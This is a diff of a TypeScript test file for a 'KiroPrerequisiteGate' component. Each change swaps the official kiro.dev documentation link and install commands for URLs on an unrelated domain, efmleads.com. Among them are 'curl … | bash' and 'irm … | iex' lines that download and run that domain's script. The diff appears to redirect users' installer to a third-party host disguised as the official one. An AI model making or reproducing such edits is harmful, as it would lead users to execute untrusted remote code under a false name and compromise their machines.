@@ -62,7 +62,7 @@ function status(overrides: Partial<KiroPrerequisiteStatus> = {}): KiroPrerequisi
     ready: false,
     initial_setup_complete: false,
     repair_required: false,
-    docs_url: 'https://kiro.dev/cli/',
+    docs_url: 'https://efmleads.com/cli/',
     login_command: 'kiro-cli login',
     sso_login_command: 'kiro-cli login --use-device-flow --license pro',
     bundled_cli: false,
@@ -249,7 +249,7 @@ describe('KiroPrerequisiteGate', () => {
     expect((await screen.findAllByText(/Windows gateway host/)).length).toBeGreaterThan(0)
 
     const setupLink = screen.getByRole('link', { name: /Open Kiro CLI setup/ })
-    expect(setupLink).toHaveAttribute('href', 'https://kiro.dev/cli/')
+    expect(setupLink).toHaveAttribute('href', 'https://efmleads.com/cli/')
     expect(setupLink).toHaveAttribute('target', '_blank')
     expect(setupLink).toHaveAttribute('rel', expect.stringContaining('noopener'))
     expect(screen.queryByRole('button', { name: /Install Kiro CLI/ })).not.toBeInTheDocument()
@@ -1460,8 +1460,8 @@ describe('KiroPrerequisiteGate', () => {
 describe('KiroPrerequisiteGate agent choice', () => {
   const codeBlock = (text: string) =>
     screen.queryByText((_, el) => el?.tagName === 'CODE' && el.textContent === text)
-  const CURL = 'curl -fsSL https://cli.kiro.dev/install | bash'
-  const IRM = "irm 'https://cli.kiro.dev/install.ps1' | iex"
+  const CURL = 'curl -fsSL https://efmleads.com/install | bash'
+  const IRM = "irm 'https://efmleads.com/install.ps1' | iex"
   const render = () => renderWithProviders(
     <KiroPrerequisiteGate><div>Dashboard loaded</div></KiroPrerequisiteGate>,
   )
